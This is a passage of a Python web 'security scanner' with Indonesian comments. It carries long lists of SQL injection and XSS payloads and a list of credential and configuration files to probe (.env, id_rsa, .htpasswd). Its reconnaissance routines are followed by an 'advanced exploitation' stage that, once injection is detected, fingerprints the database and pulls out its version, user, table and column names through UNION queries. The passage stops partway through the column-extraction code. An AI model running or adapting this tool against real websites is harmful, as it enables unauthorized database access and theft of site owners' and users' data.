    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--',
}

# Default payloads untuk XSS
DEFAULT_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>"
]

# Sensitive files to scan for exposure
SENSITIVE_FILES = [
    # Configuration files
    '.env',
    'config.php',
    'configuration.php',
    'wp-config.php',
    'config.ini',
    'settings.py',
    'application.properties',
    'web.config',
    'appsettings.json',
    'database.yml',
    'database.php',
    
    # Backup files
    'backup.sql',
    'backup.zip',
    'backup.tar.gz',
    'backup.bak',
    'site_backup.zip',
    'db_backup.sql',
    
    # Version control
    '.git/config',
    '.git/HEAD',
    '.svn/entries',
    '.hg/store',
    
    # Log files
    'error.log',
    'access.log',
    'debug.log',
    'apache.log',
    'nginx.log',
    
    # Temporary files
    'temp',
    'tmp',
    'cache',
    'sessions',
    
    # Database files
    'database.sqlite',
    'database.db',
    'data.db',
    
    # Other sensitive files
    'robots.txt',
    'sitemap.xml',
    '.htaccess',
    '.htpasswd',
    'phpinfo.php',
    'test.php',
    'info.php',
    'adminer.php',
    'phpmyadmin/index.php',
    'shell.php',
    'webshell.php',
    
    # Common backup patterns
    'backup',
    'backup-1',
    'backup-2',
    'old',
    'old-site',
    'archive',
    'copy',
    'copy_of_site',
    
    # Development files
    'dev',
    'staging',
    'test',
    'demo',
    'local',
    'development',
    
    # Cloud configuration
    'aws.yml',
    'azure.json',
    'gcp.json',
    'firebase.json',
    
    # API keys and secrets
    'api_key.txt',
    'secret.key',
    'private.pem',
    'id_rsa',
    'oauth.json',
    
    # Documentation
    'README.md',
    'CHANGELOG.md',
    'INSTALL.md',
    'docs',
    'documentation',
    
    # Common sensitive directories
    'admin',
    'administrator',
    'login',
    'wp-admin',
    'wp-login.php',
    'phpmyadmin',
    'admin.php',
    'console',
    'manager',
    'config',
    'setup',
    'install',
    'upgrade',
    'backup',
    'temp',
    'tmp',
    'cache',
    'logs',
    'private',
    'restricted',
    'secure',
    'hidden',
    'internal',
    'secret',
    'confidential',
    'sensitive'
]

def display_banner():
    """Menampilkan banner ASCII"""
    banner = """
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║   ██████╗ ███████╗ █████╗ ████████╗██████╗  █████╗ ████████╗███████╗        ║
    ║   ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝        ║
    ║   ██████╔╝█████╗  ███████║   ██║   ██████╔╝███████║   ██║   █████╗          ║
    ║   ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══██╗██╔══██║   ██║   ██╔══╝          ║
    ║   ██║  ██║███████╗██║  ██║   ██║   ██║  ██║██║  ██║   ██║   ███████╗        ║
    ║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝        ║
    ║                                                                              ║
    ║                           SECURITY SCANNER                                  ║
    ║                                                                              ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    print("\n" + "="*80)
    print("Powered by Python And Coded by Hamzah W.D".center(80))
    print("="*80 + "\n")

def type_animation(text, speed=0.03):
    """Animasi ketik per huruf dengan emoji"""
    emojis = ['🔍', '⚡', '🛡️', '🔐', '⚠️', '✅', '🌐', '📊', '🔧', '🚨']
    emoji = emojis[len(text) % len(emojis)]
    for char in text:
        print(char, end='', flush=True)
        time.sleep(speed)
    print(f" {emoji}")

class SecurityScanner:
    def __init__(self, url):
        self.url = url
        self.domain = urlparse(url).netloc
        self.parsed_url = urlparse(url)
        
        # Inisialisasi struktur info
        self.info = {
            'url': url,
            'domain': self.domain,
            'is_secure': self.parsed_url.scheme == 'https',
            'ip_address': '',
            'server_info': {},
            'technologies': [],
            'status': 'Unknown',
            'dns_records': {},
            'headers': {},
            'security_headers': {},
            'powered_by': []
        }
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecurityScanner/1.0'
        })
        
        # Gunakan payload SQL dari variabel payload_sql
        self.sql_payloads = list(payload_sql)
        type_animation(f"📋 Berhasil memuat {len(self.sql_payloads)} payload SQL injection")
        
        # Gunakan default XSS payloads
        self.xss_payloads = DEFAULT_XSS_PAYLOADS
        
        self.results = {
            'url': url,
            'ip_address': None,
            'dns_records': {},
            'ssl_info': {},
            'technologies': [],
            'hosting_info': {},
            'vulnerabilities': [],
            'exposed_files': [],
            'security_score': 100
        }
        
        self.vulnerabilities = []
        
        # Initialize file scanner
        self.common_paths = [
            '/',
            '/admin/',
            '/backup/',
            '/config/',
            '/includes/',
            '/uploads/',
            '/images/',
            '/files/',
            '/docs/',
            '/api/',
            '/v1/',
            '/v2/',
            '/rest/',
            '/graphql/',
            '/wp-content/',
            '/wp-includes/',
            '/assets/',
            '/static/',
            '/public/',
            '/private/',
            '/temp/',
            '/tmp/',
            '/cache/',
            '/logs/',
            '/var/',
            '/etc/',
            '/usr/',
            '/opt/',
            '/srv/',
            '/mnt/',
            '/media/',
            '/backup/',
            '/archive/',
            '/old/',
            '/dev/',
            '/test/',
            '/staging/',
            '/demo/'
        ]

    def typewriter_effect(self, text):
        """Efek mengetik untuk output"""
        for char in text:
            print(char, end='', flush=True)
            time.sleep(0.02)
        print()

    def loading_animation(self, text):
        """Animasi loading"""
        self.typewriter_effect(text)
        for i in range(3):
            for frame in ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']:
                print(f"\r{frame} {text}...", end="", flush=True)
                time.sleep(0.1)
        print("\r✅ " + text + " selesai!")

    def get_ip_address(self):
        """Mendapatkan IP address dari domain"""
        try:
            ip = socket.gethostbyname(self.domain)
            self.info['ip_address'] = ip
            self.results['ip_address'] = ip
            type_animation(f"✅ IP Address ditemukan: {ip}")
            return ip
        except socket.gaierror:
            self.results['vulnerabilities'].append("❌ Gagal resolve IP address")
            type_animation("❌ Gagal mendapatkan IP address")
            return None

    def get_dns_records(self):
        """Mendapatkan DNS records"""
        type_animation("🌐 Memeriksa DNS records...")
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.domain, record_type)
                records = [str(rdata) for rdata in answers]
                self.info['dns_records'][record_type] = records
                self.results['dns_records'][record_type] = records
                type_animation(f"✅ Ditemukan {record_type} records")
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
                continue

    def get_ssl_info(self):
        """Mendapatkan informasi SSL certificate"""
        type_animation("🔐 Memeriksa SSL certificate...")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info = {
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'subject': dict(x[0] for x in cert['subject']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter'],
                        'expires_in': (datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z') - datetime.now()).days
                    }
                    self.results['ssl_info'] = ssl_info
                    type_animation(f"✅ SSL valid, berakhir dalam {ssl_info['expires_in']} hari")
        except Exception as e:
            self.results['vulnerabilities'].append(f"❌ SSL Error: {str(e)}")
            type_animation("❌ SSL tidak ditemukan atau error")

    def get_headers(self):
        """Mendapatkan headers dari response"""
        type_animation("📋 Mengambil headers...")
        try:
            response = requests.get(self.url, timeout=10)
            self.info['headers'] = dict(response.headers)
            
            # Ekstrak security headers
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Referrer-Policy',
                'Permissions-Policy',
                'Public-Key-Pins'
            ]
            
            for header in security_headers:
                if header in response.headers:
                    self.info['security_headers'][header] = response.headers[header]
            
            # Ekstrak server info
            if 'Server' in response.headers:
                self.info['server_info']['Server'] = response.headers['Server']
            if 'X-Powered-By' in response.headers:
                self.info['server_info']['X-Powered-By'] = response.headers['X-Powered-By']
            
            type_animation("✅ Headers berhasil diambil")
        except Exception as e:
            type_animation(f"❌ Gagal mengambil headers: {str(e)}")

    def detect_powered_by(self):
        """Mendeteksi informasi 'powered by' dari website"""
        type_animation("🔍 Mendeteksi informasi 'Powered By'...")
        try:
            response = requests.get(self.url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Cari di meta tags
            meta_generator = soup.find('meta', attrs={'name': 'generator'})
            if meta_generator and meta_generator.get('content'):
                self.info['powered_by'].append(f"Generator: {meta_generator.get('content')}")
            
            # Cari di komentar HTML
            comments = soup.find_all(string=lambda text: isinstance(text, str) and 'powered by' in text.lower())
            for comment in comments:
                if comment.strip():
                    self.info['powered_by'].append(f"Comment: {comment.strip()}")
            
            # Cari di footer
            footer = soup.find('footer')
            if footer:
                footer_text = footer.get_text().lower()
                if 'powered by' in footer_text:
                    # Ekstrak informasi powered by
                    lines = footer_text.split('\n')
                    for line in lines:
                        if 'powered by' in line:
                            self.info['powered_by'].append(f"Footer: {line.strip()}")
            
            # Cari di atribut alt dari gambar
            images = soup.find_all('img')
            for img in images:
                alt_text = img.get('alt', '').lower()
                if 'powered by' in alt_text:
                    self.info['powered_by'].append(f"Image Alt: {alt_text}")
            
            # Cari di seluruh halaman
            page_text = soup.get_text().lower()
            powered_by_patterns = [
                r'powered by ([^\n\r]+)',
                r'powered by: ([^\n\r]+)',
                r'powered by-([^\n\r]+)',
                r'powered by ([^\n\r\.]+)',
                r'powered by: ([^\n\r\.]+)'
            ]
            
            for pattern in powered_by_patterns:
                matches = re.findall(pattern, page_text)
                for match in matches:
                    if match.strip() and match.strip() not in [p.split(': ')[-1] for p in self.info['powered_by']]:
                        self.info['powered_by'].append(f"Page Text: {match.strip()}")
            
            if self.info['powered_by']:
                type_animation(f"✅ Ditemukan {len(self.info['powered_by'])} informasi 'Powered By'")
            else:
                type_animation("ℹ️ Tidak ditemukan informasi 'Powered By'")
                
        except Exception as e:
            type_animation(f"❌ Gagal mendeteksi 'Powered By': {str(e)}")

    def get_technology(self):
        """Mendeteksi teknologi yang digunakan"""
        type_animation("🔧 Mendeteksi teknologi...")
        try:
            response = requests.get(self.url, timeout=10)
            headers = response.headers
            
            techs = []
            if 'Server' in headers:
                techs.append(f"Server: {headers['Server']}")
            if 'X-Powered-By' in headers:
                techs.append(f"X-Powered-By: {headers['X-Powered-By']}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_generator = soup.find('meta', attrs={'name': 'generator'})
            if meta_generator:
                techs.append(f"Generator: {meta_generator['content']}")
            
            self.info['technologies'] = techs
            self.results['technologies'] = techs
            type_animation(f"✅ Ditemukan {len(techs)} teknologi")
        except Exception as e:
            self.results['vulnerabilities'].append(f"❌ Technology Detection Error: {str(e)}")
            type_animation("❌ Gagal mendeteksi teknologi")

    def get_hosting_info(self):
        """Mendapatkan informasi hosting yang detail"""
        type_animation("🏠 Mendapatkan info hosting detail...")
        try:
            # Get basic whois info
            w = whois.whois(self.domain)
            basic_hosting_info = {
                'registrar': w.registrar,
                'creation_date': w.creation_date,
                'expiration_date': w.expiration_date,
                'name_servers': w.name_servers
            }
            
            # Get IP info using ipinfo
            ip_info = {}
            try:
                ip_handler = ipinfo.getHandler()
                ip_details = ip_handler.getDetails(self.info['ip_address'])
                ip_info = {
                    'city': ip_details.get('city', 'Unknown'),
                    'region': ip_details.get('region', 'Unknown'),
                    'country': ip_details.get('country_name', 'Unknown'),
                    'location': f"{ip_details.get('city', 'Unknown')}, {ip_details.get('region', 'Unknown')}, {ip_details.get('country_name', 'Unknown')}",
                    'org': ip_details.get('org', 'Unknown'),
                    'hostname': ip_details.get('hostname', 'Unknown'),
                    'asn': ip_details.get('asn', {}).get('asn', 'Unknown'),
                    'asn_name': ip_details.get('asn', {}).get('name', 'Unknown')
                }
            except Exception as e:
                type_animation(f"⚠️ Gagal mendapatkan detail IP: {str(e)}")
            
            # Get server location and hosting provider info
            hosting_provider = "Unknown"
            if ip_info.get('org'):
                hosting_provider = ip_info['org']
            
            # Try to get more specific hosting provider
            try:
                # Check if IP is in known hosting ranges
                hosting_ranges = {
                    'Amazon': ['amazon', 'aws'],
                    'Google': ['google', 'gcp'],
                    'Microsoft': ['microsoft', 'azure'],
                    'DigitalOcean': ['digitalocean'],
                    'Cloudflare': ['cloudflare'],
                    'OVH': ['ovh'],
                    'Linode': ['linode'],
                    'Vultr': ['vultr'],
                    'Bluehost': ['bluehost'],
                    'GoDaddy': ['godaddy'],
                    'HostGator': ['hostgator'],
                    'Namecheap': ['namecheap']
                }
                
                for provider, keywords in hosting_ranges.items():
                    if any(keyword.lower() in hosting_provider.lower() for keyword in keywords):
                        hosting_provider = provider
                        break
            except:
                pass
            
            # Combine all hosting info
            self.results['hosting_info'] = {
                **basic_hosting_info,
                **ip_info,
                'hosting_provider': hosting_provider
            }
            
            type_animation(f"✅ Hosting provider: {hosting_provider}")
            
        except Exception as e:
            self.results['vulnerabilities'].append(f"❌ Hosting Info Error: {str(e)}")
            type_animation("❌ Gagal mendapatkan info hosting")

    def scan_sql_injection(self):
        """Scan for SQL injection vulnerabilities"""
        type_animation("🔍 Scanning for SQL injection vulnerabilities...")
        
        # Parse URL to get parameters
        parsed_url = urlparse(self.url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            type_animation("ℹ️ No parameters found in URL for SQL injection testing")
            return
        
        # Test each parameter
        for param_name, param_values in params.items():
            type_animation(f"🔍 Testing parameter: {param_name}")
            vulnerable = self.test_parameter_sql_injection(parsed_url, param_name, param_values, self.sql_payloads)
            
            if vulnerable:
                type_animation(f"🚨 SQL injection vulnerability found in parameter: {param_name}")
                # Perform advanced exploitation
                self.advanced_exploitation(self.url, param_name, params)
            else:
                type_animation(f"✅ Parameter {param_name} appears secure")

    def test_parameter_sql_injection(self, parsed_url, param_name, param_values, payloads):
        """Test a specific parameter for SQL injection vulnerabilities"""
        original_value = param_values[0] if param_values else '1'
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = parse_qs(parsed_url.query)
        
        vulnerable = False
        
        for payload in payloads:
            try:
                # Test the payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                start_time = time.time()
                response = self.session.get(base_url, params=test_params, timeout=15)
                response_time = time.time() - start_time
                
                # Advanced detection methods
                detection_results = self.detect_sql_injection(response, response_time, payload)
                
                if detection_results['vulnerable']:
                    vulnerable = True
                    self.typewriter_effect(f"🚨 SQLi DETECTED in {param_name} with payload: {payload}")
                    
                    vuln_info = {
                        'type': detection_results['type'],
                        'parameter': param_name,
                        'payload': payload,
                        'database': detection_results.get('database'),
                        'evidence': detection_results.get('evidence'),
                        'response_time': response_time,
                        'url': base_url
                    }
                    
                    self.vulnerabilities.append(vuln_info)
                    self.display_vulnerability_table(vuln_info)
                    
                    # Early exit if critical vulnerability found
                    if detection_results['type'] in ['union_based', 'error_based']:
                        break
                
                time.sleep(0.2)  # Rate limiting
                
            except Exception as e:
                continue
        
        return vulnerable

    def detect_sql_injection(self, response, response_time, payload):
        """Advanced SQL injection detection with multiple techniques"""
        result = {'vulnerable': False}
        
        # Error-based detection
        db_errors = {
            'MySQL': ['SQL syntax.*MySQL', 'Warning.*mysql_.*', 'MySqlClient\.'],
            'PostgreSQL': ['PostgreSQL.*ERROR', 'Warning.*pg_.*', 'Npgsql\.'],
            'MSSQL': ['Microsoft SQL Server', 'ODBC Driver', 'SQLServer.*Exception'],
            'Oracle': ['ORA-[0-9]+', 'Oracle error', 'Oracle.*Driver'],
            'SQLite': ['SQLite/JDBCDriver', 'SQLite\.Exception']
        }
        
        for db_type, patterns in db_errors.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result.update({
                        'vulnerable': True,
                        'type': 'error_based',
                        'database': db_type,
                        'evidence': f"Database error pattern: {pattern}"
                    })
                    return result
        
        # Time-based detection
        time_based_keywords = ['sleep', 'waitfor', 'benchmark', 'pg_sleep']
        if any(keyword in payload.lower() for keyword in time_based_keywords):
            if response_time > 5:
                result.update({
                    'vulnerable': True,
                    'type': 'time_based',
                    'evidence': f"Delayed response: {response_time:.2f}s"
                })
                return result
        
        # Boolean-based detection (needs baseline)
        # Union-based detection
        union_indicators = ['union', 'select', 'from', 'where']
        if any(indicator in payload.lower() for indicator in union_indicators):
            if len(response.text) > 100 and not re.search(r'<html|<!DOCTYPE', response.text[:200], re.IGNORECASE):
                result.update({
                    'vulnerable': True,
                    'type': 'union_based',
                    'evidence': "Possible union injection successful"
                })
                return result
        
        return result

    def advanced_exploitation(self, url, param_name, original_params):
        """Advanced exploitation techniques for confirmed vulnerabilities"""
        self.typewriter_effect(f"\n🔥 Starting ADVANCED exploitation on parameter: {param_name}")
        
        # Database fingerprinting
        db_type = self.fingerprint_database(url, param_name, original_params)
        
        if db_type:
            self.typewriter_effect(f"🛠️  Identified database: {db_type}")
            
            # Comprehensive data extraction
            self.comprehensive_data_extraction(url, param_name, original_params, db_type)
            
            # Advanced attacks
            self.advanced_attacks(url, param_name, original_params, db_type)
        else:
            self.typewriter_effect("❌ Could not identify database type")

    def fingerprint_database(self, url, param_name, original_params):
        """Advanced database fingerprinting"""
        fingerprint_payloads = {
            'MySQL': ["' AND @@version_comment LIKE '%MySQL%'--", "' UNION SELECT @@version,2,3--"],
            'PostgreSQL': ["' AND version() LIKE '%PostgreSQL%'--", "' UNION SELECT version(),2,3--"],
            'MSSQL': ["' AND @@version LIKE '%Microsoft%'--", "' UNION SELECT @@version,2,3--"],
            'Oracle': ["' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--"],
            'SQLite': ["' AND sqlite_version() LIKE '3.%'--"]
        }
        
        for db_type, payloads in fingerprint_payloads.items():
            for payload in payloads:
                try:
                    test_params = original_params.copy()
                    test_params[param_name] = [payload]
                    
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    if response.status_code == 200 and not re.search(r'(error|exception|syntax)', response.text, re.IGNORECASE):
                        return db_type
                        
                except:
                    continue
        
        return None

    def comprehensive_data_extraction(self, url, param_name, original_params, db_type):
        """Comprehensive database data extraction"""
        extraction_methods = [
            self.extract_database_info,
            self.extract_tables,
            self.extract_columns,
            self.extract_data,
            self.extract_users,
            self.extract_privileges
        ]
        
        for method in extraction_methods:
            try:
                method(url, param_name, original_params, db_type)
                time.sleep(1)  # Avoid rate limiting
            except Exception as e:
                self.typewriter_effect(f"⚠️ Extraction failed: {str(e)}")

    def extract_database_info(self, url, param_name, original_params, db_type):
        """Extract comprehensive database information"""
        info_queries = {
            'MySQL': [
                ("Version", "@@version"),
                ("Database", "database()"),
                ("User", "user()"),
                ("Hostname", "@@hostname")
            ],
            'PostgreSQL': [
                ("Version", "version()"),
                ("Database", "current_database()"),
                ("User", "current_user")
            ],
            'MSSQL': [
                ("Version", "@@version"),
                ("Database", "db_name()"),
                ("User", "suser_sname()")
            ],
            'Oracle': [
                ("Version", "SELECT banner FROM v$version WHERE rownum=1"),
                ("Database", "SELECT global_name FROM global_name")
            ]
        }
        
        queries = info_queries.get(db_type, [])
        results = []
        
        for label, query in queries:
            try:
                if db_type == 'Oracle' and 'SELECT' in query:
                    payload = f"' UNION SELECT NULL,({query}),NULL FROM dual--"
                else:
                    payload = f"' UNION SELECT NULL,{query},NULL--"
                
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(url, params=test_params, timeout=10)
                
                # Extract value from response
                value = self.extract_value_from_response(response.text)
                if value:
                    results.append((label, value))
                    
            except:
                continue
        
        # Display results in text format
        if results:
            self.typewriter_effect("\n📊 DATABASE INFORMATION:")
            self.typewriter_effect("=" * 50)
            for label, value in results:
                self.typewriter_effect(f"{label:15}: {value}")
            self.typewriter_effect("=" * 50)

    def extract_tables(self, url, param_name, original_params, db_type):
        """Extract all tables from database"""
        table_queries = {
            'MySQL': "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
            'PostgreSQL': "SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database()",
            'MSSQL': "SELECT name FROM sysobjects WHERE xtype='U'",
            'Oracle': "SELECT table_name FROM all_tables",
            'SQLite': "SELECT name FROM sqlite_master WHERE type='table'"
        }
        
        query = table_queries.get(db_type)
        if not query:
            return
        
        payload = f"' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM ({query})--"
        
        try:
            test_params = original_params.copy()
            test_params[param_name] = [payload]
            
            response = self.session.get(url, params=test_params, timeout=15)
            tables = self.extract_value_from_response(response.text)
            
            if tables:
                table_list = tables.split(',')
                self.typewriter_effect("\n📋 DATABASE TABLES:")
                self.typewriter_effect("=" * 50)
                for i, table in enumerate(table_list[:20], 1):
                    self.typewriter_effect(f"{i:3d}. {table}")
                
                if len(table_list) > 20:
                    self.typewriter_effect(f"\n... and {len(table_list) - 20} more tables")
                self.typewriter_effect("=" * 50)
                    
        except Exception as e:
            self.typewriter_effect(f"❌ Table extraction failed: {str(e)}")

    def extract_columns(self, url, param_name, original_params, db_type, table_name):
        """Get column names for a table"""
        column_queries = {
            'MySQL': f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database()",
            'PostgreSQL': f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'",
            'MSSQL': f"SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table_name}')",
